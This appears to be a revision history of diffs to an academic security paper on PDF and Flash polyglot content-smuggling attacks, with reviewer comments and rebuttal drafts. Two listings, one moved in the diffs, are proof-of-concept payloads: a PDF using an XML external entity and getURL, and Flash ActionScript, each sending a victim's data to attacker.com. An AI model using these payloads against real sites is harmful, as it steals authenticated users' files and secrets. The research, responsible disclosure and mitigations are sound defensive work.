-belong to this set, e.g. images, before being served to the end
+accepts a limited set of benign file-formats, and the files are run through a filter to verify that they 
+belong to this set, e.g. images or documents, before being served to the end
 user. The
-service will verify the file under the assumption that it conforms strictly to one format. 
+filter will verify the file under the assumption that it conforms strictly to one format. 
 By submitting a polyglot to such a service, an attacker can evade the filter as the polyglot does conform to the benign format.
-Since the attacker can coerce the content to be interpreted as the malicious format, the
-service is tricked into serving malicious content.
+If the polyglot is publicly accessible, it can be embedded in the attackers 
+page. Since the attacker is in control over which format the polyglot is 
+interpreted as, it is embedded as the malicious format and thereby the 
+service is vulnerable to a content smuggling attack.
 
@@
 The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:smuggling-scenario}.
-The victim in this scenario is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
-The target is infiltrated by the attacker (1), manipulating the website to
-serve polyglot content. 
-The \emph{vulnerable.com} site serves the polyglot content as the benign content type, harmless to the victim. 
-At a certain point, while still authenticated to \emph{vulnerable.com}, 
-the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com} (2).
-The \emph{attacker.com} site embeds the polyglot content from \emph{vulnerable.com} (3), but
-coerces the browser to interpret it as the malicious content type (4). 
-The capabilities of the malicious format determine the 
-severity of the consequences of exploitation (5).
-
+Similarly to the previous scenarios, the victim is an authenticated user of a targeted vulnerable web site, \emph{vulnerable.com}. 
 To give more context to the scenario, \emph{vulnerable.com} can be a cloud storage service. 
-The attacker infiltrates the target by uploading a polyglot to the service and embedding it 
-on \emph{attacker.com}. While authenticated to \emph{vulnerable.com}, the unsuspecting victim visits \emph{attacker.com}, the embedded 
-polyglot is activated and extracts all the files stored in the victims account.
+The target is infiltrated by the attacker (1), who uploads a polyglot to the web site. 
+The polyglot is verified to be benign under the assumption that it belongs an allowed file type.
+%The \emph{vulnerable.com} site serves the polyglot content as the benign content type, harmless to the victim. 
+While still authenticated to \emph{vulnerable.com}, 
+the victim visits the attackers web site, \emph{attacker.com} (2).
+The \emph{attacker.com} site embeds the polyglot from \emph{vulnerable.com} (3), which is served as the benign type, but 
+coerced to be interpreted as the malicious content type by the plug-in (4). 
+The malicious format of the embedded 
+polyglot is activated and a possible payload is to extract all the files stored in the victims account.
 
@@
   \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
-  \caption{Overview of the content smuggling scenario}
+  \caption{Content smuggling scenario}
   \label{fig:smuggling-scenario}
@@
 The consequences of exploiting an infiltrated origin depend on the capabilities 
-of the format used. These consequences span from forging requests to the vulnerable website,
-abusing the credentials of the victim, to extracting sensitive information about the user that is
-stored on the vulnerable website.
+of the format used. These consequences span from abusing the credentials of 
+the victim to forge requests to the vulnerable web site, to extracting sensitive 
+information about the victim that is stored on the vulnerable web site.
 
@@
 
-If the format has the capability of issuing requests, that includes the victims 
-credentials, within the boundaries of the SOP, then this constitutes a 
-\emph{cross-site request forgery} (CSRF) attack. Websites protect against these attacks by 
+If the format has the capability of issuing requests, in particular POST requests
+within the boundaries of the SOP, that includes the victims 
+credentials,then the attacker can mount a  
+\emph{cross-site request forgery} (CSRF) attack. Web sites protect against these attacks by 
 generating a token with each response that has to be included in the subsequent 
-request. However, if the format also have the capability of reading the response 
+request. However, if the format also have the capability of reading the response of 
 the issued request, it can extract the token and thereby circumvent the CSRF 
@@
 
-If the format also has the capability of communicating with the attacker, then 
+Additionally, if the format allows communication with the origin of the attacker, then 
 the attacker can extract sensitive user information and leak it across origins. If the 
@@
 %Much like a cross-site scripting attack, we consider a scenario where a
-%website serves documents which are based upon user-supplied information.
+%web site serves documents which are based upon user-supplied information.
 
@@
 %introduce new documents. As in the previous scenario, the target is a user of
-%the vulnerable website.
+%the vulnerable web site.
 
@@
 suitable for making polyglots. One such design choice is the error tolerant 
-parser. This is in part motivated by PDF being a container format, 
+parser. This is in part motivated by another design choice namely PDF being a container format. 
 %of which the 
-another design choice which implies
+This implies
 %implication is 
@@
 %
-The content is subsequently 
+The resulting content is subsequently 
 embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
@@
 As can be noted, there is a small but significant overlap with the tokens of HTML, 
-which implies that many websites protected against cross-site scripting attacks 
+which implies that many web sites protected against cross-site scripting attacks 
 are also protected against PDF-based polyglot attacks. One of the problems of 
@@
 line feed characters. In the spirit of making minimal changes to the input, 
-certain websites only escape these characters. This is sufficient to prevent cross-site 
+certain web sites only escape these characters. This is sufficient to prevent cross-site 
 scripting attacks, but fail to protect against PDF-based polyglot attacks.
@@
 Not only in-line JavaScript fall short in this regard. JavaScript object notation 
-(JSON) is used in modern websites as a data transport. This is particularly 
-common in websites that provide an API to interact with the offered services.
+(JSON) is used in modern web sites as a data transport. This is particularly 
+common in web sites that provide an API to interact with the offered services.
 JSON encoded information suffer the same problem as in-line JavaScript, thereby
@@
 
-\begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
-%PDF-
-1 0 obj<<>>stream
-xml = '<!DOCTYPE foo[<!ENTITY x ' +
- 'SYSTEM "'+URL+'">]><foo>&x;</foo>';
-var doc = XMLData.parse(xml);
-getURL('attacker.com/?secret='+
-  doc.saveXML())
-endstream
-trailer<</Root
-   <</Pages<<>>
-      /OpenAction
-      <</S/JavaScript/JS 1 0 R>>
-   >>
->>
-\end{lstlisting}
-
 \paragraph{Embedded Flash}
@@
 
-\begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
-package {
-  import flash.net.*;
-  import flash.display.Sprite;
-  public class Secret extends Sprite {
-    var u:String;
-    var r:URLRequest;
-    var l:URLLoader;
-    public function Secret() {
-      u = 'vulnerable.com/secret';
-      r = new URLRequest(u);
-      l = new URLLoader(r);
-
-      l.addEventListener('complete', 
-        function():void {
-          u = 'attacker.com/?' + r.data;
-          r = new URLRequest(u);
-          l = new URLLoader(r);
-        });
-    }
-  }
-}
-\end{lstlisting}
-
 Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
@@
 %fragment identifier will not reload the page. Embedding the information in the fragment 
-%identifier of the URL of the embedding website, creates a one-way communication 
+%identifier of the URL of the embedding web site, creates a one-way communication 
 %channel from the document to the page. Since the fragment identifier is visible 
@@
 instances of affected components, such as browsers and PDF interpreters, 
-content sanitization filter, and a study of the Alexa top 100 websites.
+content sanitization filter, and a study of the Alexa top 100 web sites.
 
@@
 corresponding tag can be used to embed a PDF document, and for the column 
-"Adobe is default" it indicates that Adobe Reader is the commonly default PDF reader.
+"Adobe is default" it indicates that Adobe Reader is commonly the default PDF reader.
 
@@
 under. We have found two major 
-enterprise cloud storage services to be susceptible to attacks. Both service makes an effort to
-follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but fail to cover scenarios for content upload.
+enterprise cloud storage services to be susceptible to attacks. Both services make an effort to
+follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but 
+fail to cover scenarios for content upload.
 
@@
 on the kind of services provided. The mitigation recommendations for syntax 
-injection apply to all services that rely on user input, and the content smuggling
+injection apply to all services that generate content based on user input, and the content smuggling
 recommendations apply to services that serve user-supplied files.
@@
 mismatch between the content-type provided by the server and the type attribute 
-of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there can be a potential security issue in 
+of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there is a potential security issue in 
 interpreting the supplied content in the requested format and alerting the user to this
@@
 
+An intuitive approach would be to for the browsers to employ similar content-sniffing
+for content rendered in plug-ins, as is already done with content native to the browser.
+However, this intuition fails to take into account that the very reason for using plug-ins 
+is that the format is unknown to the browser. 
 One may argue that the browser is as confused as the originating server as to the 
@@
 As for the PDF file format, the underlying design decisions have led to the 
-current parsing being very relaxed, even with respect to the specification. 
+current parsing being very relaxed. 
+As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
+embed syntax from other files. 
+Even when parsing strictly according to 
+the specification, it is a simple task to create a PDF-based polyglot.
 Making the parsing more strict and enforcing many of the specified requirements 
-will reduce the attack surface. However, it is not sufficient for complete 
-mitigation. As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
-embed syntax from other files. Even when parsing strictly according to 
-the specification, it is a simple task to create a PDF-based polyglot.
+will make it harder to create polyglots, reducing the attack surface. 
+In accordance with this recommendation, Adobe has taken the first 
+steps to prevent PDF-based polyglots. Recent versions of the reader compares the first 
+bytes of the document against a set of known file signatures.
+While this is a step in the right direction, this kind of black listing has its drawbacks.
+The difficulty is that a number of file formats that lack a reliable 
+signatures, e.g., HTML.
+
+A different approach is restricting capabilities of the format, sticking to the 
+essential features. The more capable the format is, the more likely it is to 
+introduce security flaws. In the latest version of their reader Adobe has made 
+progress also in this respect 
+by restricting the possibilities for bidirectional communication.
 
@@
 
-\section{Sample PDF file}
+\section{Code samples}
 \begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
@@
 
+\begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
+%PDF-
+1 0 obj<<>>stream
+xml = '<!DOCTYPE foo[<!ENTITY x ' +
+ 'SYSTEM "'+URL+'">]><foo>&x;</foo>';
+var doc = XMLData.parse(xml);
+getURL('attacker.com/?secret='+
+  doc.saveXML())
+endstream
+trailer<</Root
+   <</Pages<<>>
+      /OpenAction
+      <</S/JavaScript/JS 1 0 R>>
+   >>
+>>
+\end{lstlisting}
+
+\begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
+package {
+  import flash.net.*;
+  import flash.display.Sprite;
+  public class Secret extends Sprite {
+    var u:String;
+    var r:URLRequest;
+    var l:URLLoader;
+    public function Secret() {
+      u = 'vulnerable.com/secret';
+      r = new URLRequest(u);
+      l = new URLLoader(r);
+
+      l.addEventListener('complete', 
+        function():void {
+          u = 'attacker.com/?' + r.data;
+          r = new URLRequest(u);
+          l = new URLLoader(r);
+        });
+    }
+  }
+}
+\end{lstlisting}
+
 \end{document}

### 2013-05-09 main.tex
at 10 pages

@@
 %make title bold and 14 pt font (Latex default is non-bold, 16 pt)
-\title{\Large \bf Polyglots : Crossing Origins by Crossing Formats}
+\title{Polyglots: Crossing Origins by Crossing Formats}
 
@@
 \newcommand{\todo}[1]{\colorbox{red}{\textcolor{white}{\sffamily\bfseries\scriptsize TODO}} \textcolor{red}{#1} \textcolor{red}{$\blacktriangleleft$}}
+
+\makeatletter
+\def\@maketitle{\newpage
+ \null
+ \setbox\@acmtitlebox\vbox{%
+\baselineskip 20pt
+%\vskip 2em                   % Vertical space above title.
+%\vskip 0em                   % Vertical space above title.
+   \begin{center}
+    {\ttlfnt \@title\par}       % Title set in 18pt Helvetica (Arial) bold size.
+%    \vskip 1.5em                % Vertical space after title.
+%This should be the subtitle.
+{\subttlfnt \the\subtitletext\par}\vskip 1.25em%\fi
+    {\baselineskip 16pt\aufnt   % each author set in \12 pt Arial, in a
+     \lineskip .5em             % tabular environment
+     \begin{tabular}[t]{c}\@author
+     \end{tabular}\par}
+ %   \vskip 1.5em               % Vertical space after author.
+   \end{center}}
+ \dimen0=\ht\@acmtitlebox
+% \advance\dimen0 by -12.75pc\relax % comment by Marco Daniel
+ \unvbox\@acmtitlebox
+ \ifdim\dimen0<0.0pt\relax\vskip-\dimen0\fi}
+\makeatother
 
@@
 from achieving cross-domain communication. 
-On the server side, santization is specific to the target language of
+On the server side, sanitization is specific to the target language of
 the web application. Sanitizing unexpected formats is typically not considered.
@@
 Unfortunately, several major web sites do not protect against polyglot
-attacks. Five out of the top 100 Alexa web sites are vulnerable to syntax injec
+attacks. Five out of the top 100 Alexa web sites are vulnerable to syntax injection
 attacks. In addition,
@@
 We refrain from mentioning names of individual web sites to prevent exploitation 
-before the issues have been properly dealt with. Neither do we disclose 
-these web sites as particularly vulnerable. We are in contact with the teams responsible for the web sites to help
+before the issues have been properly dealt with.
+We are in contact with the maintainers of the web sites to help
 mitigate the vulnerabilities.
@@
 
-These recommendations comes with a caveat that need to be taken into consideration. Some user supplied 
+These recommendations come with a caveat to be taken into consideration. Some user supplied 
 content is only meant to be accessible to certain authenticated users, e.g. photos that 
@@
 
-We also plan to extend the empirical study to popular services like
-HotCRP, Europass CV, and arXiv.org that allow uploading PDF
-documents. Authorization is pending for an in-depth security study of
-a major conference management system.
+% We also plan to extend the empirical study to popular services like
+% HotCRP, Europass CV, and arXiv.org that allow uploading PDF
+% documents. Authorization is pending for an in-depth security study of
+% a major conference management system.
 

### 2013-06-27 rebuttal.txt
Rebuttal + initial changes

To reviwers:

Thank you for your valuable feedback!

The novelty of this paper, in relation to PDFs, lies not in showing how a PDF can be malicious, 
but rather to show how the flexibility of the format makes it ideal for hiding a malicious PDF 
in another format. In relation to Flash, it is not attempting to show that Flash is vulnerable, 
but rather to show how PDF can serve as a delivery mechanism for malicious Flash. Future work 
mentions scriptable media formats, e.g., Advanced Streaming Format (ASF), as another problem area.
However, space constraints prohibited us from further exploring these formats within the scope 
of this paper.

As to the generality of the work;
In comparison to Barth et al., who only consider formats that are combined with malicious HTML. 
We show that the issue extends far beyond HTML, and that other formats can be abused in a web 
context, thereby making the results more general.

Concerning XML External Entities (XXE) in Adobe Reader, the problem of XXE was previously known 
(since ca. 2008), but considered to be of little importance. Our reports may have influenced 
Adobe's decision to finally remove them, but it is not known to us to what extent.

As is suggested, the visualization will be updated for a more professional appearance, 
and the listings moved to their appropriate positions. Finally, all typos have been corrected.

----------------------- REVIEW 1 ---------------------
PAPER: 496
TITLE: Polyglots: Crossing Origins by Crossing Formats
AUTHORS: (anonymous)

OVERALL EVALUATION: 2 (accept)

----------- REVIEW -----------
This paper examines an attack based on interpretation of scripts. The idea is that a valid script in language A is also valid in language B but does something very different. So, a script that will pass checks for maliciousness in language A is uploaded in such a way that, when a client downloads it, the script is interpreted as language B -- and that produces a malicious action.

This is not a new idea. The authors point out several examples, including GIFAR and a cross-origin CSS attack. Another good example is a type flaw in cryptographic protocols (see [1]). This paper analyzes the format of PDF objects in considerable detail, and demonstrates how to use that format to launch this type of attack.

[1] C. Boyd, "Hidden assumptions in cryptographic protocols'", IEE Proceedings E: Computers and Digital Techniques 137(6) pp. 433-436 (Nov. 1990);

The paper is an excellent, in depth study of PDFs, and how to launch this type of attack on the web. One improvement that the authors should make is to tone down their initial claim that it is a "generalization and systematic study of polyglot attacks". While it does discuss elements of such attacks in general, the discussion is not at the depth this claim suggests. The discussion of how to do this type of attack in the context of the web is general, but that does not make the paper a general and systematic study of this type of attack.

### Jonas ###
# To Andrei: Say something clever about being systematic, or take it back?
#############

Some minor comments.

Section 4 begins with a sentence that says "investigate the persistence" -- you mean "investigate the prevalence", because persistence means the vulnerabilities "go on resolutely or stubbornly in spite of opposition, importunity, or warning".

### Jonas ###
# To Andrei: Fixed.
#############

Some typographical errors:

Section 3.1.2, line 2: "indirect objects" should be "an indirect object"
Section 3.1.2, subsection "Stream objects", line 2: "shall always be" should be "is", to preserve the parallelism of the sentence Section 5.1.2, paragraph 2, line 4: "that is" should be "that are"

### Jonas ###
# To Andrei: All fixed.
#############

----------------------- REVIEW 2 ---------------------
PAPER: 496
TITLE: Polyglots: Crossing Origins by Crossing Formats
AUTHORS: (anonymous)

OVERALL EVALUATION: 1 (weak accept)

----------- REVIEW -----------
This paper proposes several new web attacks based on the idea that a file format may appear different to the webserver than the end user.
Such programs can be abused to create insecure communications across Internet origins.  The authors notice that their attacks are additional instances of the same general problem, with one notable example being the GIFAR GIF+Java Archive attack.  The authors propose that their attacks and others be considered a general category, called polyglots. Their evaluation claims 5 of the top 100 web sites are vulnerable.  The authors analyze their new polyglots, and propose mitigations.

The overall attacks are interesting and fun to read. I like the idea of generalizing the notion of specific previous instances. I think this paper will result research in more generalized defenses.

The mitigation measures aren't that exciting. For example, the authors say in 5.1.1 that there isn't a general purpose answer for syntax injection attacks. It would be nice to have thought more deeply about more general mitigation measures. I agree that there will not be a complete defense, but the authors stop at the obvious.  There is a set of security people who believe attack papers without proposed defenses aren't of much value. I don't side with them, but certainly understand that position. Having more in-depth defenses would strengthen the paper against such attacks.

### Jonas ###
# To Andrei: This is where I would have liked to add the new mitigation idea.
#
# 
#############

The basic mechanics of grammar and spelling are fine. (small exception I just noticed: "While there are exceptions to this policy, e.g.". You know the problem....there is a missing comma.)

### Jonas ###
# To Andrei: Fixed.
#############

However, I found several sections unclear and hard to read.  For example, "According to the SOP, content loaded in a plug-in is considered to belong to the origin from which it was loaded, thus allowing the polyglot to communicate with the vulnerable origin."  The word "it" could refer to multiple nouns.

### Jonas ###
# To Andrei: Corrected.
#############

"will activate the malicious polyglot".  This isn't clear; what does it mean to activate a polyglot?  Given specific names might be one way to solve the problem. In a sense, you have program M that is malicious wrapped in program N that is not.  It seems like the vulnerable website seems N||M, and interprets this as type N, while the victim sees M, the malware.

### Jonas ###
# To Andrei: Not corrected yet, thinking about it.
#############

I always find that cartoon diagrams, such as in Figure 1, look unprofessional.  This isn't a dig saying the paper isn't professional...it is. Just that the visual aids look hokey and unappealing.  A simple fix is to remove the cartoon and just use block diagrams.  Also, pay attention to scaling; when printed out the diagram is currently blurry.

### Jonas ###
# As is suggested, the visualization will be updated for a more professional appearance, 
#############

Move the listings that appear at the end of the paper in place. Not every listing has to be a float; you can just put it right underneath where you want to talk about it.

### Jonas ###
# and the listings moved to their appropriate positions.
#############

----------------------- REVIEW 3 ---------------------
PAPER: 496
TITLE: Polyglots: Crossing Origins by Crossing Formats
AUTHORS: (anonymous)

OVERALL EVALUATION: 0 (borderline paper)

----------- REVIEW -----------
This paper describes the concept of polyglots, programs that are syntactically valid in multiple languages. The focus of this work is on malicious polyglots, those programs that act benignly when loaded as one language in a particular context, but can be interpreted in a malicious manner by another language or browser plug-in. Particularly with plug-ins, it is possible to circumvent protections such as the same-origin policy, and these format-crossing polyglots can potentially inject syntax or smuggle undesired content in with them, which can then be interpreted and executed.
An example content smuggling scenario is described, as are the consequences (e.g., CSRFs and cross-origin leakage). The authors find that PDFs are particularly well suited to be polyglots, as a Flash to a slightly lesser extent. An evaluation shows that every major browser has some susceptibility to these attacks, with Chrome slightly better when it come to defending against malicious PDFs. Mitigation strategies at the server and client sides are considered.

This paper brings up an interesting area of focus, and explains it well. The paper was enjoyable to read and for someone who has not read considerably into the recent web literature, this was a very good overview of attacks that these polyglots can cause.

However, the novelty of these attacks is somewhat limited. It is hardly surprising that PDFs can be designed in a malicious fashion - Acrobat is well known for vulnerability to not only being taken over through buffer overflows, but for executing malicious PDFs as well. This was discussed in some length at BlackHat last year, where an example of a PDF hiding malicious JavaScript was shown by Jason Jones ("State of Web Exploit Kits").

### Jonas ###
# The novelty of this paper, in relation to PDFs, lies not in showing how a PDF can be malicious, 
# but rather to show how the flexibility of the format makes it ideal for hiding a malicious PDF 
# in another format.
#############

Similarly, it should come as a surprise to nobody to read that Flash is also a vulnerable format.

### Jonas ###
# In relation to Flash, it is not attempting to show that Flash is vulnerable, but rather to show
# how PDF can serve as a delivery mechanism for malicious Flash.
#############

It would have been interesting to delve into more surprising formats. The paper from Barth et al. looks at malicious PostScript, and PDF, while not being quite as bad, has certainly suffered from its share of problems.

### Jonas ###
# Future work mentions scriptable media formats, such as Windows Media Format, as another problem area.
# However, space constraints prohibited us from further exploring these formats within the scope of this paper.
#############

The evaluation for this paper felt somewhat pro forma. I would have rather seen a more extensive set of tests against the individual browsers, and perhaps to have considered mobile web browsers as well.

### Jonas ###
# Mobile browsers would indeed make an interesting addition.
#############

Where I think the paper was particularly lacking was on the mitigation side. For a venue such as this, I would have liked to have seen an implementation of one of the mitigation solutions and a full evaluation of security and performance. This could be done either on the browser or server side. Without that, this paper has more of an informational feel to it.

### Jonas ###
# To Andrei: Again this could be improved upon with the new mitigation technique. It would even be simple to
# implement and evaluate. What to do?
#
#
#############

Smaller issues:

- The related work reads like a laundry list of papers, and could stand to be more coherent in its treatment of other work, thus better positioning what the novel contribution of this paper is. The authors claim a generalization of the polyglot idea, but there were not enough cases to show a large generalization beyond what Barth et al. had already shown.

### Jonas ###
# To Andrei: Don't know how to tackle the "laundry list" part. Remove some related work?
#
# Barth et al. only consider formats that are combined with malicious HTML. We show that the issue 
# extends far beyond HTML, and that other formats can be abused in a web context, thereby making the 
# results more general.
#############

- Did the authors influence the design of XML External Entities as appears
  to be suggested in Section 3.4? If so, that is certainly worth playing up
  as a contribution.

### Jonas ###
# The problem of XML External Entities was previously known (since 2008), but considered to 
# be of little importance. Our reports may have influenced Adobe's decision to finally remove them,
# but it is not known to us to which extent.
#############

### 2013-06-27 main.tex
added label for some reason
Rebuttal + initial changes

@@
 According to the SOP, content loaded in a plug-in is considered to belong to the 
-origin from which it was loaded, thus allowing the polyglot to communicate with the vulnerable 
+origin from which the content was requested, thus allowing the polyglot to communicate with the vulnerable 
 origin. A victim visiting the attacker's web site, while authenticated in the vulnerable
@@
 
-While there are exceptions to this policy, e.g. images, scripts, and style sheets 
+While there are exceptions to this policy, e.g., images, scripts, and style sheets 
 are allowed to be included as resources across origins, access to these resources is 
@@
 \subsubsection{Objects}
-Objects can be direct or indirect, the difference being that indirect objects 
+Objects can be direct or indirect, the difference being that an indirect object 
 has labels which are used for referring to the object from another object. Object 
@@
 \paragraph{Stream objects}
-A stream is an unlimited sequence of bytes. A stream object shall always be indirect and consists of a 
+A stream is an unlimited sequence of bytes. A stream object is indirect and consists of a 
 dictionary, describing the stream, and the associated stream delimited by the 
@@
 % - Execute JavaScript
-% - Embed flash files
+% - Embed Flash files
 % - Launch commands
@@
 PDF file, and will include any cookies associated with that origin. 
-Adobe Reader also includes a flash 
-runtime to play embedded flash files on systems that do
+Adobe Reader also includes a Flash 
+runtime to play embedded Flash files on systems that do
 not have the Flash runtime installed. %Considering that it might be a conscious decision
@@
 using this approach is the significant increase in terms of file size. Even the compact 
-flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
+Flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
 This suggests that this method might be better suited for the content smuggling 
@@
 
-This section details the evaluation performed to investigate the persistence of 
+This section details the evaluation performed to investigate the prevalence of 
 the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
@@
 content is only meant to be accessible to certain authenticated users, e.g. photos that 
-is only shared with friends. In that case, the service needs to transfer the 
+are only shared with friends. In that case, the service needs to transfer the 
 credentials required to authenticate the user from the sensitive origin to the sandboxed 

### 2013-06-27 rebuttal.txt
no message

@@
-To reviwers:
+To reviewers:
 
-Thank you for your valuable feedback!
+We would like to thank the reviewers for the valuable feedback.
 
@@
 
-As to the generality of the work;
-In comparison to Barth et al., who only consider formats that are combined with malicious HTML. 
-We show that the issue extends far beyond HTML, and that other formats can be abused in a web 
-context, thereby making the results more general.
+As to the generality of the work: In comparison to Barth et al., who only consider formats
+that are combined with malicious HTML, we show that the issue extends far beyond HTML, and
+that other formats can be abused in a web context, thereby making the results more
+general.
+
+Regarding more in-depth defenses, we will be happy to include in the paper a discussion of
+most promising directions in this space. For example, note that when content is loaded in
+a specific context, as it is in the case of the paper, the browser already has exact
+knowledge as to what type it will interpret the requested content as. A natural defense
+technique can be to send the expected type along with the request. The web server then
+can compare the types and react accordingly. Further, It can be implemented in the web
+server itself (as opposed to the web application), since the web server makes the final
+decision on the supplied content-type. This can help mitigate both syntax injection and
+content smuggling.
 
@@
 
-As is suggested, the visualization will be updated for a more professional appearance, 
+As suggested, the visualization will be updated for a more professional appearance, 
 and the listings moved to their appropriate positions. Finally, all typos have been corrected.

### 2013-06-28 rebuttal.txt
no message

@@
-To reviewers:
+We would like to thank the reviewers for the valuable feedback.
 
-We would like to thank the reviewers for the valuable feedback.
+Novelty:
 
@@
 
-As to the generality of the work: In comparison to Barth et al., who only consider formats
-that are combined with malicious HTML, we show that the issue extends far beyond HTML, and
-that other formats can be abused in a web context, thereby making the results more
-general.
+Generality:
 
-Regarding more in-depth defenses, we will be happy to include in the paper a discussion of
+As proposed, we plan to make the claims of generality more precise, with our high-level
+presentation of polyglots and their abuse possibilities as general, and the focus on new
+PDF-based attacks as particular. Similarly, we agree it is a good idea to clarify the
+general vs. particular aspects of mitigation.
+
+In comparison to Barth et al., who only consider formats that are combined with malicious
+HTML, we show that the issue extends far beyond HTML, and that other formats can be abused
+in a web context, thereby making the results more general.
+
+Advanced mitigation:
+
+Regarding more advanced defenses, we will be happy to include in the paper a discussion of
 most promising directions in this space. For example, note that when content is loaded in
@@
 Adobe's decision to finally remove them, but it is not known to us to what extent.
+
+As suggested, we plan make the treatment of the related work more coherent.
 

### 2013-06-28 rebuttal.txt
Changes in progress

--- 2013-06-27 rebuttal.txt
@@
 
-The novelty of this paper, in relation to PDFs, lies not in showing how a PDF can be malicious, 
-but rather to show how the flexibility of the format makes it ideal for hiding a malicious PDF 
+Our paper builds on the work of Barth et al. who show how malicious HTML hidden in other file 
+formats can trick the browser's content-sniffing algorithm into rendering the file as HTML. Taking 
+into account previous instances of similar attacks, we show that the issue extends beyond content-
+sniffing, and generalize an attack pattern, polyglot attacks, where formats are cross-bred to hide 
+a malicious file. The novelty of this paper lies in (1) generalizing polyglot attacks, and (2) 
+showing practical that can be abused in a web context.
+
+In this paper we show that a PDF document can embed new class 
+of 
+attacks,  where polyglots...
+As to the generality of the work:
+
+Apart from generalizing the concept of polyglot attacks, our paper shows how the flexibility of 
+the PDF format makes it ideal for hiding a malicious PDF in another format.
+
+ in relation to PDFs, lies in showing how the flexibility of the format 
+makes it ideal for hiding a malicious PDF 
 in another format. In relation to Flash, it is not attempting to show that Flash is vulnerable, 
@@
 
-As to the generality of the work: In comparison to Barth et al., who only consider formats
-that are combined with malicious HTML, we show that the issue extends far beyond HTML, and
-that other formats can be abused in a web context, thereby making the results more
-general.
-
-Regarding more in-depth defenses, we will be happy to include in the paper a discussion of
+Regarding more advanced defenses, we will be happy to include in the paper a discussion of
 most promising directions in this space. For example, note that when content is loaded in
@@
 
-However, the novelty of these attacks is somewhat limited.
-It is hardly surprising that PDFs can be designed in a malicious fashion - Acrobat is well known for vulnerability to not only being taken over through buffer overflows, but for executing malicious PDFs as well.
-This was discussed in some length at BlackHat last year, where an example of a PDF hiding malicious JavaScript was shown by Jason Jones ("State of Web Exploit Kits").
+However, the novelty of these attacks is somewhat limited. It is hardly surprising that PDFs 
+can be designed in a malicious fashion - Acrobat is well known for vulnerability to not only 
+being taken over through buffer overflows, but for executing malicious PDFs as well. This was 
+discussed in some length at BlackHat last year, where an example of a PDF hiding malicious 
+JavaScript was shown by Jason Jones ("State of Web Exploit Kits").
 
@@
 
-- The related work reads like a laundry list of papers, and could stand to be more coherent in its treatment of other work, thus better positioning what the novel contribution of this paper is.
-The authors claim a generalization of the polyglot idea, but there were not enough cases to show a large generalization beyond what Barth et al.
-had already shown.
+- The related work reads like a laundry list of papers, and could stand to be more coherent in its treatment 
+of other work, thus better positioning what the novel contribution of this paper is. The authors claim a 
+generalization of the polyglot idea, but there were not enough cases to show a large generalization beyond 
+what Barth et al. had already shown.
 

### 2013-06-29 rebuttal.txt

--- 2013-06-28 rebuttal.txt
@@
-We would like to thank the reviewers for the valuable feedback.
-
-Novelty:
-
-The novelty of this paper, in relation to PDFs, lies not in showing how a PDF can be malicious, 
-but rather to show how the flexibility of the format makes it ideal for hiding a malicious PDF 
-in another format. In relation to Flash, it is not attempting to show that Flash is vulnerable, 
-but rather to show how PDF can serve as a delivery mechanism for malicious Flash. Future work 
-mentions scriptable media formats, e.g., Advanced Streaming Format (ASF), as another problem area.
-However, space constraints prohibited us from further exploring these formats within the scope 
-of this paper.
+We would like to thank the reviewers for their valuable feedback.
 
 Generality:
+
+Our paper builds on the work of Barth et al., who show how a carefully crafted file of a benign 
+format can manipulate the browser's content-sniffing algorithm into rendering the file as 
+malicious HTML. Taking into account previous instances of similar attacks, we show that the issue 
+extends beyond content-sniffing, and how other formats can be abused in a web context, thereby 
+generalizing the polyglot attack pattern.
 
@@
 
-In comparison to Barth et al., who only consider formats that are combined with malicious
-HTML, we show that the issue extends far beyond HTML, and that other formats can be abused
-in a web context, thereby making the results more general.
+Novelty:
+
+The novelty of this paper is twofold; generalizing polyglot attacks, and showing a practical 
+example of a vulnerable format. We show how the flexibility of the PDF format makes it ideal for 
+hiding a malicious PDF document in a benign format. We also discuss PDF as a delivery mechanism 
+for an embedded malicious Flash. The resulting polyglot has the flexibility of PDF and the 
+capabilities of PDF and Flash combined.
+
+As for other vulnerable formats, future work mentions scriptable media formats, e.g., Advanced 
+Streaming Format (ASF), as another problem area. However, space constraints prohibits us from 
+further exploring these formats within the scope of this paper.
 
@@
 technique can be to send the expected type along with the request. The web server then
-can compare the types and react accordingly. Further, It can be implemented in the web
+can compare the types and react accordingly. Further, it can be implemented in the web
 server itself (as opposed to the web application), since the web server makes the final
@@
 
+Evaluation of mobile browsers would indeed make an interesting addition, and certainly one we 
+would like to delve further into.
+
 Concerning XML External Entities (XXE) in Adobe Reader, the problem of XXE was previously known 
-(since ca. 2008), but considered to be of little importance. Our reports may have influenced 
-Adobe's decision to finally remove them, but it is not known to us to what extent.
+(since ca. 2005), but considered to be of low priority. Our reports may have influenced Adobe's 
+decision to finally remove them, but it is not known to us to what extent.
 
-As suggested, we plan make the treatment of the related work more coherent.
-
-As suggested, the visualization will be updated for a more professional appearance, 
-and the listings moved to their appropriate positions. Finally, all typos have been corrected.
+As suggested, we plan to make the treatment of the related work more coherent. Also, as suggested, 
+the visualization will be updated for a more professional appearance, and the listings moved to 
+their appropriate positions. Finally, all typos have been corrected, and we are working on 
+clarifying the complex sections, starting from your suggestions.
 

### 2013-06-29 rebuttal.txt
minor fix

@@
-We would like to thank the reviewers for their valuable feedback.
+We would like to thank the reviewers for the valuable feedback.
 
@@
 
-Our paper builds on the work of Barth et al., who show how a carefully crafted file of a benign 
-format can manipulate the browser's content-sniffing algorithm into rendering the file as 
